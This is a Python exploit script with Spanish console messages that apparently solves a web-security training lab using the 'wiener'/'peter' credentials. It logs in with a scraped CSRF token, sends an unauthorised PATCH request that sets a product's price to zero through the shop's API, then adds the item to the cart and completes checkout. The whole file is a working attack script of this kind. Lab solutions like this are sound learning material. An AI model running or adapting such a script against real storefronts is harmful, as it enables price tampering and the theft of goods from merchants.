import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(session,url,username):
    response = session.get(url,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input',{'name': 'csrf'})['value']
    print(f"(+) El token para el user {username} es: {csrf}")
    return csrf
    

def login_url(session,base_url,username,password):
    url = f"{base_url}/login"
    csrf = get_csrf(session,url,username)
    credential = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    response = session.post(url,data=credential,verify=False,proxies=proxies_setting)
    if "Your username is: wiener" in response.text:
        print(f"(+) Login con user {username} OK")
        return True
    else:
        print(f"(-) Login fallido")
        return False

def change_price(session,base_url):
    url_price = f"{base_url}/api/products/1/price"
    url_referer = f"{base_url}/product?productId=1"
    headers = {'Referer': url_referer}
    params = {"price":0}
    response = session.patch(url_price,json=params,headers=headers,verify=False,proxies=proxies_setting)
    if response.status_code == 200:
        print("(+) Precio cambiado!")
        return True 
    else:
        print("(-) Cambio de precio fallido.")
        return False

def add_cart(session,base_url,username):
    url_cart = f"{base_url}/cart"
    url_referer = f"{base_url}/cart"
    headers = {'Referer': url_referer}
    params = {
        'productId': 1,
        'quantity': 1,
        'redir': "CART"
    }
    response = session.post(url_cart,data=params,headers=headers,verify=False,proxies=proxies_setting)
    if "Remove" in response.text:
        print("(+) Producto agregado al carro de compras")
        
        """Realizo el pedido"""
        print("(+) Realizando el pedido...")
        url_checkout = f"{base_url}/cart/checkout"
        headers = {'Referer': url_cart}
        csrf = get_csrf(session,url_cart,username)
        params = {'csrf': csrf}
        response = session.post(url_checkout,data=params,headers=headers,verify=False,proxies=proxies_setting)
        if "Your order is on its way" in response.text:
            print("(+) Pedido realizo.")
        else:
            print("(-) Fallo en el pedido")
    else:
        print("(-) Producto no agragado al carro de compras")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Uso: {sys.argv[0]} http://ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    username = 'wiener'
    password = 'peter'
    print(f"(+) Iniciando session...")
    if login_url(session,base_url,username,password):
        print("(+) Intentando cambiar el precio del producto")
        if change_price(session,base_url):
            print("(+) Agregando producto al carro de compras...")
            add_cart(session,base_url,username)

if __name__ == "__main__":
    main()
